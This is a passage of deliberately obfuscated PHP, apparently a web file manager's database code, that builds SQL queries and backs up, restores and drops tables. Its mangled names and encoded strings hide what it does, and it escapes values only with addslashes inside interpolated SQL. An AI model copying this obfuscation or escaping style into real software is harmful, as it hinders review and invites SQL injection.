explode($ë¸…¹…İ[60], $İ‘ã¼Ô); } array_walk($İ‘ã¼Ô, array($this, $ë¸…¹…İ[1014])); $ÄÒ¶ºÀÊ = $ë¸…¹…İ[1151] . $this->parseTable($€éú‹“‚) . $ë¸…¹…İ[1011] . implode($ë¸…¹…İ[60], $İ‘ã¼Ô) . $ë¸…¹…İ[1129]; $ÄÒ¶ºÀÊ .= $this->buildSelectSql($ìªÒºÉ); return $this->execute($ÄÒ¶ºÀÊ, $this->parseBind(!empty($ìªÒºÉ[$ë¸…¹…İ[371]]) ? $ìªÒºÉ[$ë¸…¹…İ[371]] : array())); } public function update($¤øú›Å, $¨ëÆñ) { $ü±İ‰­² =& $_SERVER[ŒÅŸ‹ä†]; $this->model = $¨ëÆñ[$ü±İ‰­²[369]]; $Ì–«ˆ = $ü±İ‰­²[1152] . $this->parseTable($¨ëÆñ[$ü±İ‰­²[367]]) . $this->parseSet($¤øú›Å) . $this->parseWhere(!empty($¨ëÆñ[$ü±İ‰­²[363]]) ? $¨ëÆñ[$ü±İ‰­²[363]] : $ü±İ‰­²[12]) . $this->parseOrder(!empty($¨ëÆñ[$ü±İ‰­²[451]]) ? $¨ëÆñ[$ü±İ‰­²[451]] : $ü±İ‰­²[12]) . $this->parseLimit(!empty($¨ëÆñ[$ü±İ‰­²[378]]) ? $¨ëÆñ[$ü±İ‰­²[378]] : $ü±İ‰­²[12]) . $this->parseLock(isset($¨ëÆñ[$ü±İ‰­²[951]]) ? $¨ëÆñ[$ü±İ‰­²[951]] : !1) . $this->parseComment(!empty($¨ëÆñ[$ü±İ‰­²[439]]) ? $¨ëÆñ[$ü±İ‰­²[439]] : $ü±İ‰­²[12]); return $this->execute($Ì–«ˆ, $this->parseBind(!empty($¨ëÆñ[$ü±İ‰­²[371]]) ? $¨ëÆñ[$ü±İ‰­²[371]] : array())); } public function delete($¯Íèšæ = array()) { $ãûÁ¤¸Ó =& $_SERVER[ŒÅŸ‹ä†]; $this->model = $¯Íèšæ[$ãûÁ¤¸Ó[369]]; $ï—çãô = $ãûÁ¤¸Ó[1153] . $this->parseTable($¯Íèšæ[$ãûÁ¤¸Ó[367]]) . $this->parseWhere(!empty($¯Íèšæ[$ãûÁ¤¸Ó[363]]) ? $¯Íèšæ[$ãûÁ¤¸Ó[363]] : $ãûÁ¤¸Ó[12]) . $this->parseOrder(!empty($¯Íèšæ[$ãûÁ¤¸Ó[451]]) ? $¯Íèšæ[$ãûÁ¤¸Ó[451]] : $ãûÁ¤¸Ó[12]) . $this->parseLimit(!empty($¯Íèšæ[$ãûÁ¤¸Ó[378]]) ? $¯Íèšæ[$ãûÁ¤¸Ó[378]] : $ãûÁ¤¸Ó[12]) . $this->parseLock(isset($¯Íèšæ[$ãûÁ¤¸Ó[951]]) ? $¯Íèšæ[$ãûÁ¤¸Ó[951]] : !1) . $this->parseComment(!empty($¯Íèšæ[$ãûÁ¤¸Ó[439]]) ? $¯Íèšæ[$ãûÁ¤¸Ó[439]] : $ãûÁ¤¸Ó[12]); return $this->execute($ï—çãô, $this->parseBind(!empty($¯Íèšæ[$ãûÁ¤¸Ó[371]]) ? $¯Íèšæ[$ãûÁ¤¸Ó[371]] : array())); } public function select($”°Ûáø‹ = array()) { $‰Ş’´Ãç =& $_SERVER[ŒÅŸ‹ä†]; $this->model = $”°Ûáø‹[$‰Ş’´Ãç[369]]; $Ó²ü«âå = $this->buildSelectSql($”°Ûáø‹); $Üó»ªæ = isset($”°Ûáø‹[$‰Ş’´Ãç[434]]) ? $”°Ûáø‹[$‰Ş’´Ãç[434]] : !1; if ($Üó»ªæ) { $âòéÙ•¨ = is_string($Üó»ªæ[$‰Ş’´Ãç[105]]) ? $Üó»ªæ[$‰Ş’´Ãç[105]] : $‰Ş’´Ãç[1154] . md5($Ó²ü«âå); $ğÍ‹ïµş = think_cache($âòéÙ•¨, $‰Ş’´Ãç[12], $Üó»ªæ); if (!1 !== $ğÍ‹ïµş) { return $ğÍ‹ïµş; } } $ı€éœîõ = $this->query($Ó²ü«âå, $this->parseBind(!empty($”°Ûáø‹[$‰Ş’´Ãç[371]]) ? $”°Ûáø‹[$‰Ş’´Ãç[371]] : array())); if ($Üó»ªæ && !1 !== $ı€éœîõ) { think_cache($âòéÙ•¨, $ı€éœîõ, $Üó»ªæ); } return $ı€éœîõ; } public function buildSelectSql($æÀİ…­“ = array()) { $ÛôÄ€‡° =& $_SERVER[ŒÅŸ‹ä†]; if (isset($æÀİ…­“[$ÛôÄ€‡°[438]])) { if (strpos($æÀİ…­“[$ÛôÄ€‡°[438]], $ÛôÄ€‡°[60])) { list($äÕ›¶„õ, $ï¦ÎÏÆÕ) = explode($ÛôÄ€‡°[60], $æÀİ…­“[$ÛôÄ€‡°[438]]); } else { $äÕ›¶„õ = $æÀİ…­“[$ÛôÄ€‡°[438]]; } $äÕ›¶„õ = $äÕ›¶„õ ? $äÕ›¶„õ : 1; $ï¦ÎÏÆÕ = isset($ï¦ÎÏÆÕ) ? $ï¦ÎÏÆÕ : (is_numeric($æÀİ…­“[$ÛôÄ€‡°[378]]) ? $æÀİ…­“[$ÛôÄ€‡°[378]] : 20); $º¶€Ï = $ï¦ÎÏÆÕ * ((int) $äÕ›¶„õ - 1); $æÀİ…­“[$ÛôÄ€‡°[378]] = $º¶€Ï . $ÛôÄ€‡°[60] . $ï¦ÎÏÆÕ; } if (think_config($ÛôÄ€‡°[1155])) { $§ëÁºç¾ = $ÛôÄ€‡°[1156] . md5(serialize($æÀİ…­“)); $Òıà¼èç = think_cache($§ëÁºç¾); if ($Òıà¼èç) { return $Òıà¼èç; } } $ÕÙÔœåÊ = $this->parseSql($this->selectSql, $æÀİ…­“); $ÕÙÔœåÊ .= $this->parseLock(isset($æÀİ…­“[$ÛôÄ€‡°[951]]) ? $æÀİ…­“[$ÛôÄ€‡°[951]] : !1); if (isset($§ëÁºç¾)) { think_cache($§ëÁºç¾, $ÕÙÔœåÊ); } return $ÕÙÔœåÊ; } public function parseSql($¨ıÓÍ¢, $Ş©ÕõĞ¦ = array()) { $ªşš’çç =& $_SERVER[ŒÅŸ‹ä†]; $¨ıÓÍ¢ = str_replace(array($ªşš’çç[1157], $ªşš’çç[1158], $ªşš’çç[1159], $ªşš’çç[1160], $ªşš’çç[1161], $ªşš’çç[1162], $ªşš’çç[1163], $ªşš’çç[1164], $ªşš’çç[1165], $ªşš’çç[1166], $ªşš’çç[1167]), array($this->parseTable("{$Ş©ÕõĞ¦[$ªşš’çç[367]]}"), $this->parseDistinct(isset($Ş©ÕõĞ¦[$ªşš’çç[1168]]) ? $Ş©ÕõĞ¦[$ªşš’çç[1168]] : !1), $this->parseField(!empty($Ş©ÕõĞ¦[$ªşš’çç[361]]) ? $Ş©ÕõĞ¦[$ªşš’çç[361]] : $ªşš’çç[231]), $this->parseJoin(!empty($Ş©ÕõĞ¦[$ªşš’çç[370]]) ? $Ş©ÕõĞ¦[$ªşš’çç[370]] : $ªşš’çç[12]), $this->parseWhere(!empty($Ş©ÕõĞ¦[$ªşš’çç[363]]) ? $Ş©ÕõĞ¦[$ªşš’çç[363]] : $ªşš’çç[12]), $this->parseGroup(!empty($Ş©ÕõĞ¦[$ªşš’çç[603]]) ? $Ş©ÕõĞ¦[$ªşš’çç[603]] : $ªşš’çç[12]), $this->parseHaving(!empty($Ş©ÕõĞ¦[$ªşš’çç[1169]]) ? $Ş©ÕõĞ¦[$ªşš’çç[1169]] : $ªşš’çç[12]), $this->parseOrder(!empty($Ş©ÕõĞ¦[$ªşš’çç[451]]) ? $Ş©ÕõĞ¦[$ªşš’çç[451]] : $ªşš’çç[12]), $this->parseLimit(!empty($Ş©ÕõĞ¦[$ªşš’çç[378]]) ? $Ş©ÕõĞ¦[$ªşš’çç[378]] : $ªşš’çç[12]), $this->parseUnion(!empty($Ş©ÕõĞ¦[$ªşš’çç[432]]) ? $Ş©ÕõĞ¦[$ªşš’çç[432]] : $ªşš’çç[12]), $this->parseComment(!empty($Ş©ÕõĞ¦[$ªşš’çç[439]]) ? $Ş©ÕõĞ¦[$ªşš’çç[439]] : $ªşš’çç[12])), $¨ıÓÍ¢); return $¨ıÓÍ¢; } public function getLastSql($ú²ßêŠ = '') { return $ú²ßêŠ ? $this->modelSql[$ú²ßêŠ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($—¾Íî©ş) { return addslashes($—¾Íî©ş); } public function setModel($ñèàÂ¶°) { $this->model = $ñèàÂ¶°; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($›ÒÈª € = array()) { $ñ÷ˆ§Ò =& $_SERVER[ŒÅŸ‹ä†]; if (empty($›ÒÈª €)) { $›ÒÈª € = $GLOBALS[$ñ÷ˆ§Ò[6]][$ñ÷ˆ§Ò[31]]; } $this->database = $›ÒÈª €; } public function model($ô¡ş¶œ” = '') { return new ModelBase($ô¡ş¶œ”, $_SERVER[ŒÅŸ‹ä†][12], $this->database); } public function db($¸«°‰¨ä = false) { $ÍŸ—µãÚ =& $_SERVER[ŒÅŸ‹ä†]; $Ó´Ä”‘ = array_change_key_case($this->database); if ($this->dbType() == $ÍŸ—µãÚ[23] || !$¸«°‰¨ä) { return $this->model()->db(); } $Âîáü‹ = $Ó´Ä”‘[$ÍŸ—µãÚ[1083]]; $Ó´Ä”‘[$ÍŸ—µãÚ[1083]] = $ÍŸ—µãÚ[12]; if ($Ó´Ä”‘[$ÍŸ—µãÚ[1078]] == $ÍŸ—µãÚ[1075]) { $èı¢³ç¥ = $Ó´Ä”‘[$ÍŸ—µãÚ[1084]]; $Ó´Ä”‘[$ÍŸ—µãÚ[1084]] = substr($èı¢³ç¥, 0, strrpos($èı¢³ç¥, $ÍŸ—µãÚ[1170])); } $this->database = $Ó´Ä”‘; $ó¦¡èÕİ = $this->model()->db(); try { $š»öÎÜ = $ó¦¡èÕİ->execute("\x73\150\x6f\x77\x20\x64\141\x74\x61\x62\x61\x73\145\x73\x20\x6c\x69\153\x65\40\x27{$Âîáü‹}\47"); } catch (Exception $¡ç¤½³) { } if (!$š»öÎÜ) { $ó¦¡èÕİ->execute("\x63\162\145\141\164\x65\x20\144\x61\x74\141\x62\141\163\x65\40\140{$Âîáü‹}\140"); } $Ó´Ä”‘[$ÍŸ—µãÚ[1083]] = $Âîáü‹; if ($Ó´Ä”‘[$ÍŸ—µãÚ[1078]] == $ÍŸ—µãÚ[1075]) { $Ó´Ä”‘[$ÍŸ—µãÚ[1084]] .= $ÍŸ—µãÚ[1170] . $Âîáü‹; } $this->database = $Ó´Ä”‘; $ó¦¡èÕİ->execute("\165\x73\145\x20\140{$Âîáü‹}\x60"); return $ó¦¡èÕİ; } public function createTable($õª…Ÿì, &$Üí˜öÕ´) { $ò½Œ»–† =& $_SERVER[ŒÅŸ‹ä†]; if (!IO::exist($õª…Ÿì)) { show_json(LNG($ò½Œ»–†[1171]), !1); } $ø°ºÈöñ = $this->model()->db(); $„Áòü£à = sqlSplit(IO::getContent($õª…Ÿì)); foreach ($„Áòü£à as $ƒàà‡Ñ†) { $‚ââÌÁ® = stripos($ƒàà‡Ñ†, $ò½Œ»–†[1172]) === 0; if ($‚ââÌÁ®) { $Üí˜öÕ´->task[$ò½Œ»–†[1173]] += 1; } $ø°ºÈöñ->execute($ƒàà‡Ñ†); if ($‚ââÌÁ®) { preg_match($ò½Œ»–†[1174], $ƒàà‡Ñ†, $ï¨ïÓµö); $Üí˜öÕ´->task[$ò½Œ»–†[1175]] = $ï¨ïÓµö[1]; $Üí˜öÕ´->update(1); } } } public function insertTable($å¬¦§ºÙ, &$Ş˜ÀÒØË) { $Ä’¬Œ´¥ =& $_SERVER[ŒÅŸ‹ä†]; $ø·”Ÿ÷ = $this->model()->db(); $šçÍºÒ = $˜õßà»ù ? array($˜õßà»ù) : $ø·”Ÿ÷->getTables(); foreach ($å¬¦§ºÙ as $« ¾˜Ú¬) { $˜õßà»ù = basename($« ¾˜Ú¬, $Ä’¬Œ´¥[889]); if (!in_array($˜õßà»ù, $šçÍºÒ)) { continue; } $Ş˜ÀÒØË->task[$Ä’¬Œ´¥[1175]] = $˜õßà»ù; if ($˜õßà»ù == $Ä’¬Œ´¥[883]) { continue; } if (get_filesize($« ¾˜Ú¬) == 0) { continue; } $­»« Ü = $this->sqlToDb($« ¾˜Ú¬, $Ş˜ÀÒØË); if (!$­»« Ü) { show_json(LNG($Ä’¬Œ´¥[1176]) . "\x5b{$˜õßà»ù}\x5d", !1); } } } public function sqlFromDb($Èî¼Áíü, $ºşÑ¦Å, &$í™îĞš, $ËÆÈÄÒ  = '') { if ($í™îĞš) { $í™îĞš->task[$_SERVER[ŒÅŸ‹ä†][1175]] = $Èî¼Áíü; } $› êğû€ = $this->model($Èî¼Áíü); $á©Š¹™‡ = 0; $ı÷¯ËÔª = 0; $„—Û®¯¥ = 10000; $û½Û = fopen($ºşÑ¦Å, $_SERVER[ŒÅŸ‹ä†][1177]); $‹¿Ã´Ù = $› êğû€->getPk(); $”ÒÛºø¡ = $› êğû€->getDbFields(); $»©šë¬÷ = $_SERVER[ŒÅŸ‹ä†][12]; if ($GLOBALS[$_SERVER[ŒÅŸ‹ä†][888]] && in_array($Èî¼Áíü, array($_SERVER[ŒÅŸ‹ä†][1178], $_SERVER[ŒÅŸ‹ä†][1179]))) { $»©šë¬÷ = $Èî¼Áíü; } do { $¸¨¨ú˜í = array($‹¿Ã´Ù => array($_SERVER[ŒÅŸ‹ä†][1125], $ı÷¯ËÔª)); $‰¯…¶ªÆ = $› êğû€->where($¸¨¨ú˜í)->field($”ÒÛºø¡)->order($‹¿Ã´Ù . $_SERVER[ŒÅŸ‹ä†][1180])->limit($„—Û®¯¥)->select(); $‰¯…¶ªÆ = !empty($‰¯…¶ªÆ) ? $‰¯…¶ªÆ : array(); if (!($ñºÇ£íš = count($‰¯…¶ªÆ))) { break; } $ˆ³åòŠ = end($‰¯…¶ªÆ); $ı÷¯ËÔª = $ˆ³åòŠ[$‹¿Ã´Ù]; $«íêïÏ» = array(); foreach ($‰¯…¶ªÆ as $òÌ°å©Á) { if ($»©šë¬÷) { if ($Èî¼Áíü == $_SERVER[ŒÅŸ‹ä†][1178]) { if ($òÌ°å©Á[$_SERVER[ŒÅŸ‹ä†][43]] == $_SERVER[ŒÅŸ‹ä†][1181]) { $ª÷öÉã = json_decode($òÌ°å©Á[$_SERVER[ŒÅŸ‹ä†][460]], !0); if ($ª÷öÉã[$_SERVER[ŒÅŸ‹ä†][42]] == $GLOBALS[$_SERVER[ŒÅŸ‹ä†][888]] && $ª÷öÉã[$_SERVER[ŒÅŸ‹ä†][846]] != 1) { continue; } } } else { if ($òÌ°å©Á[$_SERVER[ŒÅŸ‹ä†][43]] == $_SERVER[ŒÅŸ‹ä†][1182] && $òÌ°å©Á[$_SERVER[ŒÅŸ‹ä†][105]] == $_SERVER[ŒÅŸ‹ä†][884]) { continue; } } } if ($ËÆÈÄÒ ) { $òÌ°å©Á[$_SERVER[ŒÅŸ‹ä†][97]] = "\173\151\157\x3a{$ËÆÈÄÒ }\x7d" . substr($òÌ°å©Á[$_SERVER[ŒÅŸ‹ä†][97]], strlen("\173\x69\x6f\72{$òÌ°å©Á[$_SERVER[ŒÅŸ‹ä†][922]]}\x7d")); $òÌ°å©Á[$_SERVER[ŒÅŸ‹ä†][922]] = $ËÆÈÄÒ ; } $«íêïÏ»[] = $_SERVER[ŒÅŸ‹ä†][1183] . $this->sqlEncode($òÌ°å©Á) . $_SERVER[ŒÅŸ‹ä†][1184]; } $Æ¸Èô’… = "\111\x4e\123\x45\122\x54\40\111\x4e\124\x4f\x20\x60{$Èî¼Áíü}\x60\40\50\140" . implode($_SERVER[ŒÅŸ‹ä†][1185], $”ÒÛºø¡) . $_SERVER[ŒÅŸ‹ä†][1186]; fwrite($û½Û, $Æ¸Èô’… . implode($_SERVER[ŒÅŸ‹ä†][1187], $«íêïÏ») . $_SERVER[ŒÅŸ‹ä†][84] . PHP_EOL); $á©Š¹™‡ += $ñºÇ£íš; if ($í™îĞš) { $í™îĞš->update($ñºÇ£íš); } } while ($„—Û®¯¥ == $ñºÇ£íš); fclose($û½Û); return $á©Š¹™‡; } public function sqlToDb($Æ­ÃÕ×†, &$¡‡®±†´) { $ä‘àÄĞ† =& $_SERVER[ŒÅŸ‹ä†]; $æ˜‡Êç‡ = $this->model()->db(); $‘•¨ÎçŞ = @fopen($Æ­ÃÕ×†, $ä‘àÄĞ†[1188]); if (!$‘•¨ÎçŞ) { return !1; } $Ã½Ó£Ù¹ = 0; $«¥ù¦‚Ã = $ä‘àÄĞ†[12]; $ü¦†ŒÙ = array(); $äÉÂØ…ğ = $this->dbType(); $ÕŠ­ºŞË = $äÉÂØ…ğ == $ä‘àÄĞ†[23] ? 500 : 2000; $üêãª´á = basename($Æ­ÃÕ×†, $ä‘àÄĞ†[889]); $‰®åÖİÏ = 0; $µÊ‘÷ãÖ = 4194304; while (!feof($‘•¨ÎçŞ)) { $âòúœ€ = trim(fgets($‘•¨ÎçŞ)); if (!$âòúœ€) { continue; } $óå Ö¶ = $this->sqlDecode($âòúœ€, $äÉÂØ…ğ, $üêãª´á); if (stripos($óå Ö¶, $ä‘àÄĞ†[440]) === 0) { if (!$«¥ù¦‚Ã) { $«¥ù¦‚Ã = $óå Ö¶ . $ä‘àÄĞ†[63]; } continue; } if ($¡‡®±†´) { $¡‡®±†´->task[$ä‘àÄĞ†[1173]] += 1; } $Ã½Ó£Ù¹++; $ü¦†ŒÙ[] = rtrim(rtrim(trim($óå Ö¶), $ä‘àÄĞ†[60]), $ä‘àÄĞ†[84]); $ÑÈà¹ŸÇ = null; $³…µïõ = strlen($óå Ö¶); $‰®åÖİÏ += $³…µïõ; $õ¨ßå = strlen($«¥ù¦‚Ã) + $‰®åÖİÏ + (count($ü¦†ŒÙ) - 1); if ($õ¨ßå >= $µÊ‘÷ãÖ) { $ÑÈà¹ŸÇ = array_pop($ü¦†ŒÙ); if ($Ã½Ó£Ù¹ > 1) { $Ã½Ó£Ù¹--; } } if ($Ã½Ó£Ù¹ >= $ÕŠ­ºŞË || $ÑÈà¹ŸÇ) { $óå Ö¶ = $«¥ù¦‚Ã . implode($ä‘àÄĞ†[60], $ü¦†ŒÙ); if (!$æ˜‡Êç‡->execute($óå Ö¶)) { return !1; } if ($¡‡®±†´) { $¡‡®±†´->update($Ã½Ó£Ù¹); } $ü¦†ŒÙ = array(); $Ã½Ó£Ù¹ = 0; $‰®åÖİÏ = 0; if ($ÑÈà¹ŸÇ) { $ü¦†ŒÙ = array($ÑÈà¹ŸÇ); $Ã½Ó£Ù¹ = 1; $‰®åÖİÏ = $³…µïõ; } } } fclose($‘•¨ÎçŞ); if (!empty($ü¦†ŒÙ)) { $óå Ö¶ = $«¥ù¦‚Ã . implode($ä‘àÄĞ†[60], $ü¦†ŒÙ); if (!$æ˜‡Êç‡->execute($óå Ö¶)) { return !1; } if ($¡‡®±†´) { $¡‡®±†´->update($Ã½Ó£Ù¹); } } return !0; } public function dropTable($Ûà¦™†• = null) { $é’¡šØÉ =& $_SERVER[ŒÅŸ‹ä†]; $Ñš¿ë– = $this->model()->db(); $Å®İãş¹ = $Ûà¦™†• ? array($Ûà¦™†•) : $Ñš¿ë–->getTables(); if (!$Å®İãş¹) { return; } foreach ($Å®İãş¹ as $Ûà¦™†•) { if ($Ûà¦™†•) { $Ûà¦™†• = strtolower($Ûà¦™†•); } else { continue; } $Ñš¿ë–->execute($é’¡šØÉ[1189] . $this->escapeName($Ûà¦™†•) . $é’¡šØÉ[1190]); } } private function sqlEncode($×õµ Š„) { $Ê¼Õ©ó =& $_SERVER[ŒÅŸ‹ä†]; $œüÅŸ§ù = array(); foreach ($×õµ Š„ as $ĞœªµØ) { if (is_array($ĞœªµØ)) { $ĞœªµØ = json_encode_force($ĞœªµØ); } $ĞœªµØ = addslashes($ĞœªµØ); $ĞœªµØ = str_replace(array($Ê¼Õ©ó[1191], $Ê¼Õ©ó[18], $Ê¼Õ©ó[427]), array($Ê¼Õ©ó[1192], $Ê¼Õ©ó[1193], $Ê¼Õ©ó[1194]), $ĞœªµØ); $œüÅŸ§ù[] = $ĞœªµØ; } return $Ê¼Õ©ó[68] . implode($Ê¼Õ©ó[1195], $œüÅŸ§ù) . $Ê¼Õ©ó[68]; } private function sqlDecode($°¬Ü€›õ, $àÓÑ§¿, $´¨Œ®æË = '') { $ÃƒÜĞ =& $_SERVER[ŒÅŸ‹ä†]; $°¬Ü€›õ = str_replace(array($ÃƒÜĞ[1192], $ÃƒÜĞ[1193], $ÃƒÜĞ[1194]), array($ÃƒÜĞ[1191], $ÃƒÜĞ[18], $ÃƒÜĞ[427]), $°¬Ü€›õ); if ($àÓÑ§¿ == $ÃƒÜĞ[23]) { $°¬Ü€›õ = str_ireplace($ÃƒÜĞ[1196], $ÃƒÜĞ[69], $°¬Ü€›õ); $°¬Ü€›õ = stripslashes($°¬Ü€›õ); } return preg_replace($ÃƒÜĞ[1197], $ÃƒÜĞ[12], $°¬Ü€›õ); if ($àÓÑ§¿ == $ÃƒÜĞ[23]) { return $´¨Œ®æË != $ÃƒÜĞ[883] ? stripslashes($°¬Ü€›õ) : $°¬Ü€›õ; } if ($´¨Œ®æË == $ÃƒÜĞ[883]) { $°¬Ü€›õ = str_replace($ÃƒÜĞ[1198], $ÃƒÜĞ[129], stripslashes($°¬Ü€›õ)); } return $°¬Ü€›õ; } public function getSqlFile($Œ¯š‡Ï¹ = '') { $Ö†€¿ó =& $_SERVER[ŒÅŸ‹ä†]; $İ†Ğö¾ä = $this->dbType(!0); $¿úôÙšì = CONTROLLER_DIR . "\151\x6e\x73\164\141\x6c\154\57\x64\x61\x74\x61\57{$İ†Ğö¾ä}\56\x73\x71\154"; if (!file_exists($¿úôÙšì)) { return !1; } $º­ØïË’ = file_get_contents($¿úôÙšì); $ñ©·Ä¢ = $Ö†€¿ó[1199] . ($İ†Ğö¾ä == $Ö†€¿ó[900] ? $Ö†€¿ó[1200] : $Ö†€¿ó[1201]) . $Ö†€¿ó[1202]; preg_match_all($ñ©·Ä¢, $º­ØïË’, $¾¯×Š); $ÀæĞÈ’ = $¾¯×Š[1]; $èşÌ¬Ê¶ = $this->model()->db(); $áÕ™âú = $èşÌ¬Ê¶->getTables(); $Ï³ÂÁúÊ = TEMP_FILES . $Ö†€¿ó[1203] . date($Ö†€¿ó[270]) . $Ö†€¿ó[8]; del_dir($Ï³ÂÁúÊ); mk_dir($Ï³ÂÁúÊ); $Ú¾åí×İ = $Ï³ÂÁúÊ . $Ö†€¿ó[1204]; $­Ì‘¶¥Û = $Ï³ÂÁúÊ . $Ö†€¿ó[1205]; $ªšÏ£¾î = $İ†Ğö¾ä == $Ö†€¿ó[23] ? $Ö†€¿ó[900] : $Ö†€¿ó[23]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\141\154\x6c\57\144\x61\x74\x61\57{$ªšÏ£¾î}\56\x73\x71\154", $Ï³ÂÁúÊ); @touch($Ï³ÂÁúÊ . $İ†Ğö¾ä . $Ö†€¿ó[889]); $Õ±ÒïÒû = fopen($Ú¾åí×İ, $Ö†€¿ó[1177]); $·øõ¸É = fopen($­Ì‘¶¥Û, $Ö†€¿ó[1177]); if ($İ†Ğö¾ä == $Ö†€¿ó[23]) { $áÕ™âú = array_diff($áÕ™âú, array($Ö†€¿ó[881], $Ö†€¿ó[882])); $ª¦÷°ƒâ = array($Ö†€¿ó[1206], $Ö†€¿ó[1207], $Ö†€¿ó[1208]); fwrite($·øõ¸É, implode(PHP_EOL, $ª¦÷°ƒâ) . PHP_EOL . PHP_EOL); foreach ($áÕ™âú as $Ó×Ö•ä) { $ûåğáÜê = $this->sqlFromSqlite($Ó×Ö•ä); if (!$ûåğáÜê[$Ö†€¿ó[23]]) { continue; } fwrite($·øõ¸É, $ûåğáÜê[$Ö†€¿ó[23]] . PHP_EOL . PHP_EOL); if (!in_array($Ó×Ö•ä, $ÀæĞÈ’)) { fwrite($Õ±ÒïÒû, $ûåğáÜê[$Ö†€¿ó[900]] . PHP_EOL . PHP_EOL); } } } else { foreach ($áÕ™âú as $Ó×Ö•ä) { $ûåğáÜê = $this->sqlFromMysql($Ó×Ö•ä); if (!$ûåğáÜê[$Ö†€¿ó[900]]) { continue; } fwrite($Õ±ÒïÒû, $ûåğáÜê[$Ö†€¿ó[900]] . PHP_EOL . PHP_EOL); if (!in_array($Ó×Ö•ä, $ÀæĞÈ’)) { fwrite($·øõ¸É, $ûåğáÜê[$Ö†€¿ó[23]] . PHP_EOL . PHP_EOL); } } } fclose($Õ±ÒïÒû); fclose($·øõ¸É); $º­ØïË’ = array($Ö†€¿ó[900] => $Ú¾åí×İ, $Ö†€¿ó[23] => $­Ì‘¶¥Û); return $Œ¯š‡Ï¹ ? $º­ØïË’[$Œ¯š‡Ï¹] : $º­ØïË’; } public function dbType($â…š²Â¬ = false) { $Ìãä¾„ş =& $_SERVER[ŒÅŸ‹ä†]; $…îÄíàâ = $â…š²Â¬ ? $GLOBALS[$Ìãä¾„ş[6]][$Ìãä¾„ş[31]] : $this->database; $…îÄíàâ = array_change_key_case($…îÄíàâ); $†¦Ü¥Œ½ = $…îÄíàâ[$Ìãä¾„ş[1078]]; if ($†¦Ü¥Œ½ == $Ìãä¾„ş[1075]) { $µÀƒğ´ = explode($Ìãä¾„ş[4], $…îÄíàâ[$Ìãä¾„ş[1084]]); $†¦Ü¥Œ½ = $µÀƒğ´[0]; } $¢îÇÆ® = array($Ìãä¾„ş[1209] => $Ìãä¾„ş[23], $Ìãä¾„ş[1023] => $Ìãä¾„ş[900]); if (isset($¢îÇÆ®[$†¦Ü¥Œ½])) { $†¦Ü¥Œ½ = $¢îÇÆ®[$†¦Ü¥Œ½]; } return $†¦Ü¥Œ½; } public function sqlFromMysql($ŸşÑ¸ì, $º¨ëñ’Ó = '') { $”Ä……Ç =& $_SERVER[ŒÅŸ‹ä†]; $©Ğû„¨´ = array($”Ä……Ç[900] => $”Ä……Ç[12], $”Ä……Ç[23] => $”Ä……Ç[12]); $ŸÇ­¯ø³ = $this->escapeName($ŸşÑ¸ì); $¥²ÌÔ = $this->escapeName($ŸşÑ¸ì, $”Ä……Ç[23]); $°ı‚ûöŸ = $this->model()->db(); $ï¸Ÿú§ö = $°ı‚ûöŸ->query("\x73\x68\157\x77\40\143\x72\145\141\x74\x65\40\x74\x61\142\154\x65\40{$ŸÇ­¯ø³}\73"); if (!$ï¸Ÿú§ö || !$ï¸Ÿú§ö[0]) { return !1; } $„†Ë“¤– = _get($ï¸Ÿú§ö[0], $”Ä……Ç[1210], $”Ä……Ç[12]); if (!$„†Ë“¤–) { return !1; } $ÙŸ¤’éé = "\x44\122\117\x50\x20\x54\101\x42\114\105\x20\111\106\40\x45\x58\111\x53\x54\x53\x20{$ŸÇ­¯ø³}\x3b" . PHP_EOL . $„†Ë“¤– . $”Ä……Ç[84]; if ($º¨ëñ’Ó == $”Ä……Ç[900]) { return $ÙŸ¤’éé; } $©Ğû„¨´[$”Ä……Ç[900]] = $ÙŸ¤’éé; $¾­˜„’ = array_change_key_case($GLOBALS[$”Ä……Ç[6]][$”Ä……Ç[31]]); $ÁÃêËıÑ = $¾­˜„’[$”Ä……Ç[1083]]; $½öÁçÖœ = $”Ä……Ç[1211] . $ÁÃêËıÑ . "\x27\x20\101\116\x44\x20\x54\101\102\114\x45\x5f\x4e\101\x4d\105\40\75\40{$¥²ÌÔ}\73"; $±ŠÀ´µü = "\123\110\x4f\127\x20\111\x4e\104\x45\130\40\106\122\x4f\x4d\40{$ŸÇ­¯ø³}\73"; $È”«ä§ä = $°ı‚ûöŸ->query($½öÁçÖœ); if (empty($È”«ä§ä)) { return $º¨ëñ’Ó ? $©Ğû„¨´[$º¨ëñ’Ó] : $©Ğû„¨´; } $Ï¢¨”‹ä = $°ı‚ûöŸ->query($±ŠÀ´µü); $ì„«Ë„Ğ = $”Ä……Ç[12]; $İÜ¹—é† = array(); foreach ($Ï¢¨”‹ä as $–ôÚÎøê) { if (!$ì„«Ë„Ğ && $–ôÚÎøê[$”Ä……Ç[1212]] == $”Ä……Ç[1213]) { $ì„«Ë„Ğ = $–ôÚÎøê[$”Ä……Ç[1214]]; } if (isset($İÜ¹—é†[$–ôÚÎøê[$”Ä……Ç[1212]]])) { $İÜ¹—é†[$–ôÚÎøê[$”Ä……Ç[1212]]][$”Ä……Ç[1215]][] = $–ôÚÎøê[$”Ä……Ç[1214]]; continue; } $İÜ¹—é†[$–ôÚÎøê[$”Ä……Ç[1212]]] = array($”Ä……Ç[1216] => $–ôÚÎøê[$”Ä……Ç[1212]], $”Ä……Ç[1215] => array($–ôÚÎøê[$”Ä……Ç[1214]]), $”Ä……Ç[1217] => $–ôÚÎøê[$”Ä……Ç[1218]] == $”Ä……Ç[101] ? 0 : 1); } $˜ÑÁ‘›Ó = array(); foreach ($İÜ¹—é† as $–ôÚÎøê) { $ˆ†ˆ€ñ‡ = $–ôÚÎøê[$”Ä……Ç[1216]] == $”Ä……Ç[1213]; $“–´™ğ¬ = $–ôÚÎøê[$”Ä……Ç[1217]] == $”Ä……Ç[101] && !$ˆ†ˆ€ñ‡ ? $”Ä……Ç[1219] : $”Ä……Ç[12]; $ó¢Áã© = $”Ä……Ç[1220] . $ŸşÑ¸ì . $”Ä……Ç[11] . ($ˆ†ˆ€ñ‡ ? $”Ä……Ç[1221] : $–ôÚÎøê[$”Ä……Ç[1216]]); $ã›ÚÏ€¹ = $”Ä……Ç[1222] . implode($”Ä……Ç[1223], $–ôÚÎøê[$”Ä……Ç[1215]]) . 